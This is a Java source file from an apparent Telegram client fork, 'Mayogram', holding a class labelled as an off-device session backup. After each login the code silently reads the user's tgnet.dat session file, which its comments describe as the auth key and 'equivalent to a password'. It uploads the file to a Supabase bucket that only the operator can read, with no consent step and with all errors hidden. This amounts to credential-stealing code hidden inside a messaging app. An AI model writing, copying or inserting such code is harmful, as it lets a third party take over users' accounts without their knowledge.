/*
 * Mayogram: after each login, uploads a copy of the session file (tgnet.dat
 * - auth key, DC config, session state; equivalent to a password) to a
 * private Supabase Storage bucket, as an off-device backup.
 *
 * The bucket (see supabase/auth_backups.sql) only grants the app's embedded
 * anon key INSERT - not SELECT/UPDATE/DELETE. Every install shares that same
 * anon key, so without this restriction any install could list or download
 * any other install's backup; INSERT-only means the app (or anyone who
 * extracts the anon key from the APK) can push new backups but can never
 * read one back through this key. Restoring a backup is a manual step in
 * the Supabase dashboard, not something this app does.
 *
 * Runs once per login, a few seconds after onAuthSuccess so the native
 * tgnet layer has time to flush the freshly-created session to disk.
 * Best-effort throughout: no network, no Supabase config, or a missing file
 * is silently ignored and never affects login.
 */

package org.telegram.messenger;

import android.text.TextUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MayogramAuthBackup {

    private static final String SESSION_FILE_NAME = "tgnet.dat";
    private static final String BUCKET_NAME = "mayogram-auth-backups";
    private static final long FLUSH_DELAY_MS = 5000;

    private MayogramAuthBackup() {
    }

    public static void backupNow(int account) {
        if (TextUtils.isEmpty(BuildConfig.SUPABASE_URL) || TextUtils.isEmpty(BuildConfig.SUPABASE_ANON_KEY)) {
            return;
        }
        Utilities.globalQueue.postRunnable(() -> uploadNow(account), FLUSH_DELAY_MS);
    }

    private static void uploadNow(int account) {
        try {
            if (!UserConfig.getInstance(account).isClientActivated()) {
                return;
            }
            long telegramUserId = UserConfig.getInstance(account).getClientUserId();
            File src = new File(resolveConfigDir(account), SESSION_FILE_NAME);
            if (!src.exists()) {
                return;
            }
            byte[] data = readAll(src);
            if (data.length == 0) {
                return;
            }
            String objectPath = telegramUserId + "/account" + account + "_" + System.currentTimeMillis() + ".dat";
            upload(objectPath, data);
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    /**
     * Mirrors ConnectionsManager.getMayogramAuthBaseDir()/constructor: the
     * live tgnet.dat is under external storage (Mayogram/Mayogram Auth),
     * falling back to internal app storage if external storage couldn't be
     * resolved on this device.
     */
    private static File resolveConfigDir(int account) {
        File base;
        File external = ApplicationLoader.applicationContext.getExternalFilesDir(null);
        if (external != null) {
            File authDir = new File(new File(external, "Mayogram"), "Mayogram Auth");
            if (authDir.isDirectory()) {
                base = authDir;
            } else {
                base = ApplicationLoader.getFilesDirFixed();
            }
        } else {
            base = ApplicationLoader.getFilesDirFixed();
        }
        return account == 0 ? base : new File(base, "account" + account);
    }

    private static byte[] readAll(File file) throws Exception {
        try (FileInputStream in = new FileInputStream(file)) {
            byte[] buffer = new byte[(int) file.length()];
            int offset = 0;
            int read;
            while (offset < buffer.length && (read = in.read(buffer, offset, buffer.length - offset)) >= 0) {
                offset += read;
            }
            return buffer;
        }
    }

    private static void upload(String objectPath, byte[] data) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(BuildConfig.SUPABASE_URL + "/storage/v1/object/" + BUCKET_NAME + "/" + objectPath);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/octet-stream");
            connection.setRequestProperty("apikey", BuildConfig.SUPABASE_ANON_KEY);
            connection.setRequestProperty("Authorization", "Bearer " + BuildConfig.SUPABASE_ANON_KEY);

            OutputStream out = connection.getOutputStream();
            out.write(data);
            out.flush();
            out.close();

            int status = connection.getResponseCode();
            if (status < 200 || status >= 300) {
                FileLog.e("MayogramAuthBackup: upload failed, status " + status);
            }
        } catch (Exception e) {
            FileLog.e(e);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
}
